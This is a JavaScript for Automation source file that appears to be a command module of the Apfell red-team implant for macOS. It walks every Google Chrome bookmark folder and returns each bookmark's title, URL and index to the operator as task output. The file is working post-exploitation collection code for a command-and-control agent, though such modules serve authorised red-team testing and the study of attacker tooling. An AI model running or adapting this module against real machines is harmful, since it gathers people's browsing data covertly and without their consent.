exports.chrome_bookmarks = function(task, command, params){
	let all_data = [];
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            let folders = ch.bookmarkFolders;
            for (let i = 0; i < folders.length; i ++){
                let folder = folders[i];
                // we are using the fact that JS passes arrays by reference here to pass a reference to all_data
                chrome_bookmarks_enum_folder(folder, all_data);
            }
        }
        else{
            return {"user_output": "Chrome is not running", "completed": true, "status": "error"};
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return {"user_output":err, "completed": true, "status": "error"};
	}
	return {"user_output": all_data, "completed": true};
};

let chrome_bookmarks_enum_folder = function(folder, all_data, folderPath = ""){

    // for each folder under our current bookmark folder - call chrome_bookmarks_enum_folder
    for (let i = 0; i < folder.bookmarkFolders.length; i++){
        chrome_bookmarks_enum_folder(folder.bookmarkFolders[i], all_data, folderPath + folder.title() + "/");
    }

    // once we are done with folders, let's work on the bookmarkd items
    chrome_bookmarks_enum_itmes(folder, all_data, folderPath);

};

let chrome_bookmarks_enum_itmes = function(folder, all_data, folderPath){
    let bookmarks = folder.bookmarkItems;
    
    all_data.push("Folder Name: " + folderPath + folder.title());
    
    for (let j = 0; j < bookmarks.length; j++){
        
        let info = "Title: " + bookmarks[j].title() +
        "\nURL: " + bookmarks[j].url() +
        "\nindex: " + bookmarks[j].index() +
        // note i'm using folder.index() here since each folder has a unique index within each parent container
        // this will result in multiple folders with the same index if they are members of different folders
        "\nFolder/bookmark: " + folder.index() + "/" + j;
        all_data.push(info); //populate our array
    }

};